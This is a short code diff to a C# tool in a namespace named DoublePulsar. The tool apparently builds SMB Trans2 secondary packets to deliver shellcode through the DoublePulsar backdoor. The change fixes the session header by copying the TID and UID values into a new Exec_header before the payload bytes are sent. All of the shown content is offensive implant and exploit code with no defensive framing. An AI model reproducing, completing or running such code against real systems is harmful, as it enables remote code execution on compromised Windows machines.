@@ -906,7 +906,7 @@ namespace DoublePulsar
                         padding = 0x00
                     };
 
-                    SMB_HEADER header = new SMB_HEADER
+                    SMB_HEADER Exec_header = new SMB_HEADER
                     {
                         protocol = 0x424d53ff,
                         command = 0x32,
@@ -923,9 +923,12 @@ namespace DoublePulsar
                         UID = 0x0008,     //need this value from previous exchanges
                         MID = 0x0042
                     };
-
+                
+                    Exec_header.TID = header.TID;
+                    Exec_header.UID = header.UID;
+                
                     //Merge SMBHeader with the transaction2SecondaryRequest
-                    byte[] headerBytes = GetBytes(header);
+                    byte[] headerBytes = GetBytes(Exec_header);
 
                     transaction2SecondaryRequest.TotalDataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
                     transaction2SecondaryRequest.DataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
